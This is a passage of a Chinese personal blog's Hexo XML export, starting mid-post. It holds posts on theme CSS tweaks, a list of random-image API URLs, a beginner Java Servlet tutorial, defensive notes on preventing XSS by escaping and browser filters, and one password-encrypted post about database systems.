class="hljs-attribute">cursor</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;/img/cur1.png&quot;</span>), default <span class="hljs-meta">!important</span>;<br>&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">cursor</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;/img/cur1.png&quot;</span>), pointer <span class="hljs-meta">!important</span>;<br>&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">span</span> &#123;<br>    <span class="hljs-attribute">cursor</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;/img/cur1.png&quot;</span>), pointer <span class="hljs-meta">!important</span>;<br>&#125;<br><span class="hljs-selector-tag">div</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">img</span> &#123;<br>    <span class="hljs-attribute">cursor</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;/img/cur1.png&quot;</span>), pointer <span class="hljs-meta">!important</span>;<br>&#125;<br><span class="hljs-selector-tag">div</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">span</span> &#123;<br>    <span class="hljs-attribute">cursor</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;/img/cur1.png&quot;</span>), pointer <span class="hljs-meta">!important</span>;<br>&#125;<br><span class="hljs-selector-tag">div</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">button</span> &#123;<br>    <span class="hljs-attribute">cursor</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;/img/cur1.png&quot;</span>), pointer <span class="hljs-meta">!important</span>;<br>&#125;<br><span class="hljs-selector-tag">div</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">textarea</span> &#123;<br>    <span class="hljs-attribute">cursor</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;/img/cur2.png&quot;</span>), pointer <span class="hljs-meta">!important</span>;<br>&#125;<br><span class="hljs-selector-tag">div</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">input</span> &#123;<br>    <span class="hljs-attribute">cursor</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;/img/cur2.png&quot;</span>), pointer <span class="hljs-meta">!important</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x06-滚动条">0x06 滚动条</h2><p><strong>/source/css/roll.css</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 滚动条bynote.cn */</span><br><br>::-webkit-scrollbar &#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><br>::-webkit-scrollbar-thumb &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#2764e9</span>;<br>    <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">-webkit-linear-gradient</span>( <span class="hljs-number">45deg</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.4</span>) <span class="hljs-number">25%</span>, transparent <span class="hljs-number">25%</span>, transparent <span class="hljs-number">50%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.4</span>) <span class="hljs-number">50%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.4</span>) <span class="hljs-number">75%</span>, transparent <span class="hljs-number">75%</span>, transparent);<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2em</span>;<br>&#125;<br><br>::-webkit-scrollbar-corner &#123;<br>    <span class="hljs-attribute">background-color</span>: transparent;<br>&#125;<br><br>::-moz-selection &#123;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#2764e9</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="0x07-说说">0x07 说说</h2><p>说说采用了<em>Artitalk</em>模版，按照说明文档使用即可。</p><div class="note note-info">            <p>说明文档请看：<a href="https://artitalk.js.org/">https://artitalk.js.org/</a></p>          </div><p>这里另外提一下fluid主题的自定义页面配置，在<strong>config_fluid.yml</strong>文件里照着关于页写一个自定义页的模版：</p><p><img src="/2021/05/05/%E5%8D%9A%E5%AE%A2%E6%96%B0%E4%B8%BB%E9%A2%98%E7%9A%84%E6%8A%98%E8%85%BE%E8%BF%87%E7%A8%8B/image-20210604192804133.png" alt></p><p>再在上面的menu选项中对照添加即可，最后不要忘记在<em>hexo\node_modules\hexo-theme-fluid\languages\zh_CN.yml</em>中添加自定义页的解释信息。</p><h2 id="0x08-参考">0x08 参考</h2><p><a href="https://github.com/stevenjoezhang/live2d-widget/issues/2">https://github.com/stevenjoezhang/live2d-widget/issues/2</a></p><p><a href="https://github.com/stevenjoezhang/live2d-widget">https://github.com/stevenjoezhang/live2d-widget</a></p><p><a href="https://www.fghrsh.net/post/123.html">https://www.fghrsh.net/post/123.html</a></p><p><a href="https://hexo.fluid-dev.com/docs/guide/">https://hexo.fluid-dev.com/docs/guide/</a></p><p><a href="https://bestzuo.cn/posts/notoserifsc.html">https://bestzuo.cn/posts/notoserifsc.html</a></p>]]></content>
    
    
    <categories>
      
      <category>折腾</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录几个获得随机图片的接口</title>
    <link href="/2021/05/05/%E8%AE%B0%E5%BD%95%E5%87%A0%E4%B8%AA%E8%8E%B7%E5%BE%97%E9%9A%8F%E6%9C%BA%E5%9B%BE%E7%89%87%E7%9A%84%E6%8E%A5%E5%8F%A3/"/>
    <url>/2021/05/05/%E8%AE%B0%E5%BD%95%E5%87%A0%E4%B8%AA%E8%8E%B7%E5%BE%97%E9%9A%8F%E6%9C%BA%E5%9B%BE%E7%89%87%E7%9A%84%E6%8E%A5%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言">0x00 前言</h2><p>每次写文章给博文配图是一件很麻烦的事情，一张张地找，有时候质量还不好，于是乎，我就去寻找了一波背景图api接口，这下妈妈再也不用担心我文章不会配图了，废话不多说，直接上干货。</p><h2 id="0x01-接口">0x01 接口</h2><p><strong>必应背景图</strong></p><p>1366*768分辨率图片地址</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://api.dujin.org/bing/1366.php<br></code></pre></td></tr></table></figure><p>1920*1080分辨率图片地址</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://api.dujin.org/bing/1920.php<br></code></pre></td></tr></table></figure><p><strong>小歪API</strong></p><p><img src="https://pic1.zhimg.com/50/v2-7acf0becf5f70f775747f3f6314eb415_hd.jpg?source=1940ef5c" alt></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://api.ixiaowai.cn/api/api.php<br></code></pre></td></tr></table></figure><p>menhear酱</p><p><img src="https://pic4.zhimg.com/50/v2-feda306ec2f382de347a5025ed3952fd_hd.jpg?source=1940ef5c" alt></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://api.ixiaowai.cn/mcapi/mcapi.php<br></code></pre></td></tr></table></figure><p>风景</p><p><img src="https://pic1.zhimg.com/50/v2-b9b4d9810f52c6abe894cee39e4d9a97_hd.jpg?source=1940ef5c" alt></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://api.ixiaowai.cn/gqapi/gqapi.php<br></code></pre></td></tr></table></figure><p>参数：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">type=json<br></code></pre></td></tr></table></figure><p>JSON调用格式</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">列：https://api.ixiaowai.cn/api/api.php?return=json<br></code></pre></td></tr></table></figure><p>JSON数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">&#123;<br>    &quot;code&quot;:&quot;200&quot; #图片状态码<br>    &quot;acgurl&quot;:&quot;https:\/\/ws1.sinaimg.cn\/large\/0072Vf1pgy1foxkjcneg1j31kw0w0hbs.jpg&quot; #图片地址<br>    &quot;width&quot;:&quot;2048&quot; #图片宽<br>    &quot;height&quot;:&quot;1152&quot; #图片高<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>其他随机图片的api接口</strong>（质量未检查，请大家自行查看）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs text"> http://lorempixel.com/1600/900<br> https://unsplash.it/1600/900?random（国内加载略慢）<br>  https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture【返回必应图片】 <br> https://uploadbeta.com/api/pictures/random/?key=%E6%8E%A8%E5%A5%B3%E9%83%8E【随机美女图片】<br>  &lt;http://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&gt;（必应返回JSON数据，具体百度）<br> https://api.ixiaowai.cn/api/api.php<br><br>http://www.dmoe.cc/random.php<br><br>https://api.ixiaowai.cn/mcapi/mcapi.php<br><br>https://acg.yanwz.cn/wallpaper/api.php<br><br>https://acg.yanwz.cn/api.php<br><br>https://img.paulzzh.tech/touhou/random<br><br>https://i.xinger.ink:4443/images.php<br><br>https://api.lyiqk.cn/acg<br><br>https://api.lyiqk.cn/miku<br><br>https://random.52ecy.cn/randbg.php<br><br>https://img.catct.cn/mc.php<br><br>https://img.catct.cn<br><br>https://img.catct.cn/pixiv.php<br><br>https://img.xjh.me/random_img.php?return=302<br><br>风景类图片<br>https://api.ixiaowai.cn/gqapi/gqapi.php<br><br>https://api.lyiqk.cn/scenery<br><br>https://acg.yanwz.cn/scenery/api.php<br><br>现代化图片<br>https://source.unsplash.com/random<br><br>https://unsplash.it/1600/900?random<br><br>https://api.comzg.com/<br><br>https://source.unsplash.com/user/erondu/1600x900<br><br>https://source.unsplash.com/user/tkirkgoz/1600x900<br><br>https://unsplash.it/1600/900?random<br><br>美女写真<br>https://api.lyiqk.cn/sexylady<br><br>https://api.lyiqk.cn/purelady<br><br>https://uploadbeta.com/api/pictures/random/?key=推女郎<br><br>https://uploadbeta.com/api/pictures/random/?key=二次元<br><br>https://uploadbeta.com/api/pictures/random/?key=动漫<br><br>https://api.ixxcc.com/cosplay.php?return=img<br><br>https://cdn.seovx.com/?mom=302<br></code></pre></td></tr></table></figure><h2 id="0x02-参考">0x02 参考</h2><p><a href="https://www.zhihu.com/question/21168322">https://www.zhihu.com/question/21168322</a></p><p><a href="https://www.qian.blue/archives/SanQianZhiTu-random_img.html">https://www.qian.blue/archives/SanQianZhiTu-random_img.html</a></p>]]></content>
    
    
    <categories>
      
      <category>折腾</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Servlet学习</title>
    <link href="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是Servlet">0x00 什么是Servlet</h2><p>Servlet是Java Web开发的基石，为JavaWEB三大组件之一，其余两个分别是Filter过滤器，Listener监听器。Servlet程序运行在Servlet容器上，也可以说是运行在服务器/Tomcat上，负责和客户端进行通信。JSP就是Servlet。并且Servlet是JavaEE规范之一，<strong>规范就是接口</strong>。</p><h2 id="0x01-功能">0x01 功能</h2><ol><li><p>可以创建并返回基于用户请求的动态html页面</p></li><li><p>与数据库进行通信</p><ul><li>如何使用Servlet？</li></ul></li></ol><p>Servlet本身是一组接口，只需要自定义一个类并且实现Servlet借口，这个类就具备了接收客户端请求以及各种响应的功能。</p><h2 id="0x02-写一个Hello-world">0x02 写一个Hello world</h2><p>这里用的IDE版本是idea2020.3，服务器是tomcat-7.0.109。</p><ol><li><p>新建项目   <img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504190820501.png" alt="新建项目，选择java模块，其余不动"></p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504190836921.png" alt="输入项目名称"></p></li><li><p>添加框架支持</p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191144062.png" alt="添加框架支持"></p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191150572.png" alt="选择web应用程序"></p></li><li><p>导入相关库</p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191215522.png" alt="文件-项目结构"></p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191240940.png" alt="导入servlet依赖"></p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191304588.png" alt="从下载好的tomcat的lib路径里寻找"></p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191326916.png" alt="导入成功"></p></li><li><p>新建Servlet</p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191356034.png" alt="右键src目录，新建servlet"></p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191416691.png" alt="输入名称"></p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191539686.png" alt="编写语句"></p></li><li><p>编写Web.xml</p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191843667.png" alt="见注释"></p></li><li><p>调试运行</p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191913672.png" alt="新建配置环境"></p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504191904511.png" alt="在部署里找到项目目录"></p></li></ol><h2 id="0x03-小记">0x03 小记</h2><p>最后的效果如图：</p><p><img src="/2021/05/03/Servlet%E5%AD%A6%E4%B9%A0/image-20210504192020832.png" alt="最终效果"></p><p>虽然本篇看着内容简单，其实还是走了挺多弯路的，尤其我之前完全没有接触过java…</p><p>首先就是IDE的问题，我用的版本比较新，为2020.3版本，建立java web项目和之前的版本不太一样，需要先建立个空项目再去构建框架。</p><p>之后就是tomcat的版本问题，一开始导入的是tomcat9版本的servlet的jar包，写servlet类的时候一直import不到相关的库，后来在外部库展开jar包发现，javax目录里是空的，不知道什么原因（但是tomcat9本身也是在官网下载的，并且调试一切正常）。</p><p>最后换了旧版本tomcat7成功导入库，写了servlet类。然后又遇到了一个新手问题，就是怎么在index.jsp里引用刚才写的servlet。</p><p>一开始是准备参照帖子写个ajax出来，用script标签加载，结果不太行，不知道怎么回事。</p><p>最后还是根据网上的视频，在web.xml里引入<servlet-mapping>标签，给servlet程序一个绝对路径来执行，之后就成功了。</servlet-mapping></p><h2 id="0x04-参考">0x04 参考</h2><p><a href="https://www.bilibili.com/video/BV1Y7411K7zz?p=122">https://www.bilibili.com/video/BV1Y7411K7zz?p=122</a></p><p><a href="https://blog.csdn.net/qq_29656961/article/details/78127083">https://blog.csdn.net/qq_29656961/article/details/78127083</a></p><p><a href="https://zhuanlan.zhihu.com/p/359127621">https://zhuanlan.zhihu.com/p/359127621</a></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>此处有坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS的一些笔记</title>
    <link href="/2021/03/29/XSS%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/03/29/XSS%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="防止xss攻击">防止xss攻击</h3><h4 id="转义">转义</h4><p>无论是服务端型还是客户端型xss，攻击达成都需要两个条件</p><ul><li>代码被注入</li><li>代码被执行</li></ul><p>其实只要做好无论任何情况下保证代码不被执行就能完全杜绝xss攻击.</p><p>总之, 任何时候都不要把不受信任的数据直接插入到dom中的任何位置, 一定要做转义。</p><p><strong>对于某些位置,不受信任的数据做转义就可以保证安全</strong></p><ul><li>一般的标签属性值</li><li>div body 的内部html</li></ul><p><strong>对于某些位置，即使做了转义依然不安全</strong></p><ul><li>script标签中</li><li>注释中</li><li>表签的属性名名</li><li>标签名</li><li>css标签中</li></ul><p>使用JSON.parse 而不是eval, request 的content-type要指定是Content-Type: application/json;</p><p>如果链接的URL中部分是动态生成的, 一定要做转义.</p><h4 id="使用浏览器自带的xss-filter">使用浏览器自带的xss-filter</h4><p><a href="http://louiszhai.github.io/docImages/xss01.png"><img src="/2021/03/29/XSS%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/xss01.png" alt="xss-filter"></a></p><blockquote><p>可以通过http头控制是否打开 xss-filter, 默认为开启…</p></blockquote><p>通常情况下, 在http header中加入以下字段表示启用xss-filter.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-XSS-Protection:<span class="hljs-number">1</span> (默认)<br><span class="hljs-attribute">X</span>-XSS-Protection:<span class="hljs-number">1</span>;mode=block (强制不渲染, chrome跳空白页,IE展示一个#号)<br><span class="hljs-attribute">12</span><br></code></pre></td></tr></table></figure><p>如需禁用xss-filter, 将 <code>X-XSS-Protection</code> 设置为0即可.</p><p>如上, 现代浏览器都对反射型xss有一定的防御力, 其原理是检查url和dom中元素的相关性. 但这并不能完全防止反射型xss. 这里有个可供测试的链接, 传送门: <a href="http://www.enhanceie.com/test/xss/">XSS Test Page</a>.</p><p>另外, 浏览器对于存储型xss并没有抵抗力, 原因很简单, 用户的需求是多种多样的. 所以, 抵御xss这件事情不能指望浏览器.</p><h3 id="Content-Type-application-json，IE例外">Content-Type: application/json，IE例外</h3><p><a href="http://www.91ri.org/16545.html">http://www.91ri.org/16545.html</a></p><p>win7/IE7-11复现成功</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据库系统概论</title>
    <link href="/2021/02/12/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/"/>
    <url>/2021/02/12/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，密码错误~" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容~">  <script id="hbeData" type="hbeData" data-hmacdigest="0d58ef5546ddbbb8de207debdf3c34d47d96c18e5ff5cd69c845ca2e7fa931c9">da2b40cabefb236431f60326dbcf8c62fea8e3a871d741cfda55e5db6676661b259ad3951363b418de2eacb776bcbc2b5ae87c3871c37bcc2cf86aeffc6aa6e36478c7166409b7e62b95899996e35672641b2b7be43ee06c86fe15f018d0e6b5b47ae653475609e8c539598758995fb84369af1f1c0d5ea043b3ea204e83d77066db4e3a9f37240eb94462d15a1c28d828d76841e8aa289de80378f0a3717be29aa484bb5bf5e1349eaa8fd5882264120147cfdf7a8fb18f25686ef59e1f3f55044e20a9f394e6c631e2fc01648f5ecc75ea2e98e22939e65ad3b61518cb61db036564391158c54ec8e122f09f395dbbc0bdbed960904bb544c34a28fb16370d885551537f12c8ea6f3029a51e9d6aef4680fc55a0b8b40a6778d1eb625fb3fd873ecb260a73c03947e84a962492b693116e0307280eab8d16c181efdfd6daad3f6542017abb15d7a29706b326fe020e1731d8bf1c9edcc97b892a283856bff4ecae2d4397f0b3ef41579a1dfa8eea5e544292db5b4b391ab71a0aa5ead8031d079dc50d830abbc92d8fbb0befe6d454c98cfb22622eeb50dff8c5da4c165d52ff7920f8648337d3f8c85bea88df796ee5167fa83873e2f4b5d6b346efc63f7fa58d4ec75750132935035ea6f956c4109f666427f97081fbe31cf19c23d6a8f080fa7d6868f89dc0bf4b1f96e4162ae27b7c1c16ad4c23462fea926bad74e4c86b7eea49736e3cd634c352947fe7de85e599cd5214d20b07163aa337dc1061522de8bb1b2146554e4ec37f4e098d558b6b26ad1b91247642b3165b62172f49a08baa0252cc85d3cd79af989aeaf9b87be11c984754ecaac6a39594c7598b0c26ba9631eec249b09c4cfdb890ce514f588316ccecf90baa9ec3b56dbc93e2c870a5cdd5e78a0ad881631029b8842b88006a521f6354272629227c6bdcf4249e398212fc23497b81b5ac5c075e438f96341b81ea805338483688f6a732bb929e5072be7f4cb7fac176f3398f4ff45eadfdaba444cba428d51d0e0bba10fbf8fa0e1ff86b0a39d40c057eb67ad89d6cc31dee529101b99a7d3d3d194f87dd240be0ead614d8c230f350068188729b9a16915cffc1d8d91616b6b898bd81ffbe2372395526376c1791748d2fe019aeb8e2fbff6a36fbfc7f9d37faef66424789bdc4a2081678a65162c8269945573ded11c79ecbac1bc366b121edbd1928ca60b3fd4cd84e0bd992ea6decc2c9203b94b97ab7b509f4d40e533a65eb771307af13be61bcc4dbd5fb50c7311a760666e1f705a5cfb0b898bc0146118ede08aeda9f49b0ab980432922d6b3f7fd35bf3bfeb899529b38528bccd1d8ffc54fe1ad0ca261232ad79dddd07a9296b97d014b499e891c812d4c81715b404c9e12953ca4293b32f79b5e45c6918747409bde4e6526d6d4b812038f3223bb2e1e7cf32d8bfe252f1c80eaa973ed3f6f13180b3a73847f58ed01a7622f6cc393195303fcf139e3c4c89466457c0db5f3a2bfa0cb439f53bd4fef56b8c5e24532eefd3f180a011cc42afff69303400a13ed13b21b2571bd0dadb875b37bcca4f0f0c1e520625c685d4f252de77a118f55401b73c6851b0949ae18b8957d6aba22ca002820b8f5368d1408b39ecf07eccea40c2f27cc978080a2e227e1ad4530088cda9980f3579ebd84ea562c466b474fd2d5897a9fbcc6ef6f25ebc2b67d3e0fd5eef94e506433252f6f39c495a306ba54325945e2757a2ab3ee08fc80dddbe2c45f223c280e69bc208f412846002f6f93dd3371991ef8fc275697161c659208592407e8460bb662640431ae73f29a7fb36286b9db877fa1aaee083a1a5ad0bc0792681b20e145d5727f1393327e83feb0a607d2fcde48c88d339f1567da7b6558788c6433ba8bf8c146edac3f28d538120bb0ed1d8dfe488023765d4f384ff010731eee2f74567c8519a8a59a94dfd406a7d5f6fa4ad1a187336f78b2a2c84541d3d12413e117fd9b0d9bc6981bf3c6abcee302203fa29048a5e4667ad3a96a6f69eadc27bea976a3185449b3fae39991b4a92ef67db34da72532c15c1ca9556344d1b65d947eb1d1c15c787ca39e9e1b18b975dcfb4cc72835311fd49bc70d811daeab9745e910a48302c3b67301c7767c81b4e930f1d3973f092c70d3f7abfe1936bc60303117073d2d076b16866906854fa6d9edd7c3d4ee3dba457df319710ccde6f7478f29ea269b602e56428c5be7f823bc9db1d34bf20d041b43ade83afc9f3e0a03a124cb91054e8e2191a53194780fb669d80f981f91ec4a3efd53f181cfb7209129b37088f1e99b262d2f3096efb0b8e9b29ce7c86db5b8bab69405399dcc36a8659c98e2203b3fe62a186e6ccea4be06d1b990199b432e919508e01edc3b14f81d8457f9248428297d30b2de9a106a195ca8e73511a540b4eeb9a0cc0dae7fdbe6d2dbc45c59abf8d03efa4182fb961d440d1a984d3bf158a92e2903e662d4809200c4d37787d0b8d818e130d94e7e035ac180a9b9a3cea81f8b34a67e8d9d6463eb81c86676191baf82ef77c54433458ff790ecc6073f64497aa22f4431234ea670ad1776f0215147165cf6d432e6b9fd107bbfaf7cd426b8b15ae147a60b898d09c99060fb23165bb8c2f439dc0f7f054b7c3486543d33fd97322b9d7220ed70a333d2216f848834564e32854492737b23611b8d701299b04e5b423bf36e517b2c8e9072b9b890fb032740d494097da2ebae386f5e59720e12af1cd6d7fefd80f8571fd22ab879a34cf5106f3eb2109b97d11f748746bab598e1e72b8a30472370c3a79bbf5e02cfd81a0cfc9b5edd611cd09a7bc14a01c96d68a1c0a6dab94fc17d402f9b8660a2051d1a5e3723b699141cff8a309fd2cb8bda74144531ef8b91324b7b681cd98f95aedc6e95b2f369977cd0cf6b0a164085a8d1ae02ca6dcd9c5e7105fefb0f230815190dbcf55fac47ebdf8bc238268ce9a03ab5c7f13970380e29a6fbbf3e439b63027743884e188ff672994b1c864878e5b202136b34241c63d0a5195b35258a5827cf1e3a422eeb4ed0226229538084ed0ba6ce40ec615527a206260a8aba136dbc89ec21f95810811c46eab91f4f247d24bd2baf10cbb7fa209261a110be0e2dc949cc8e69977eca9bd32f4596a96fc70991efc147403fe4fd6c8ad209997ef88b60200fe3fdcda2e6c66aff1a7b1eb4bce6bcf4a7abb9e21d9b2b87d674fa81f17895506b4e04cf1a4d9002d2d990ebb942809705d3cb1abcfcc1b7d72c676b5ba87e7ca5b7a31fa2a69da9750ae69546efbc3a5c3dd6c3e4373fd9bf0438752090ea6452e022d2d0a83fa22dc99e3412cfcb81e631fbb2088f3606c4fe6cdf8c7574a7bedaec8f7a3c8fa16b41e5f4e2fcdbc8d1456e7fe894f1385e6b59029958255240a6d8af4b49121125e2002286c25f56d693038f525e66c01f434bcfafe1cff4ac1ee103a076e1f010fad98a1ea264c83591af6018d10995ee8d198e63269ae2466e5d2dde0f398a20d4c735b454d748c2dd7e851db79bb64dbf92b9b47002a440f1c4c7938b0a026d9859045b5320be961c3cfb4ba9079aa301f28858494f45bc29a908ab66092c9260ec581da71207b0b8722aa3e4b1d3ed9cfe2706bbd6f1a9796b5610e73a9124b1c9426d875b6b8fa44810665584607fbf52c100e3ca64ec4481031bc3a604be9760bf979c20729a5d63b43064b0c8318b5de91d83f5f1385238cb66fef08e75370a41817b33892487b20522fc1145a1c397cc92d1d1fa792751c96e0dc3a1541ecd07294ab61f120073e2195c7e71614351abbe27f8ae30aafdfcf1ede826bcbb91b26a9cc285d79b19da87403ccac64d8540aee11a1b0d087dd7ef7990369ba3e599ecc98f9675728c3c172d663653048e11851d33b2aabc30309123f9b20e926f11f48ca0dcf3b292f01307042c8888b0e71b1949d7b546c8bb8b30a47187e10321f51971c7b77f7b71683bc19f7a63db5e31f94cbca4e429c0204125cb297e8cc0fb8695659a5a0c13269d1a3782cc800834be94174a6d13b29efb898af9f014f32a9a6199ba5eae5c57407199505ce33e92365ca378bbdef2bafa41115c262c7f86355a301ea858f5ca39c0d87c411d1e77eae7ca7a9e980b99dd97c14ace8016669f484807d928994725483a2547c253fdfa366511e11c1756361c7d8a45ab68121bb43ff92f4db9e51247a39a029a2ebfbb89d73396316c41df914d60b8d67f69f8896de6248ae8bc7f7a43a5685c5d2b3297334a7f552af2f3d1a498807f655b7987672803cd87ffd14467ac26afed96ba2d682435b20f80102f7758193fac38cc0fcf88b143de263739ba64452ece7239be849a656e660898d6ed1ed58b150211db3998961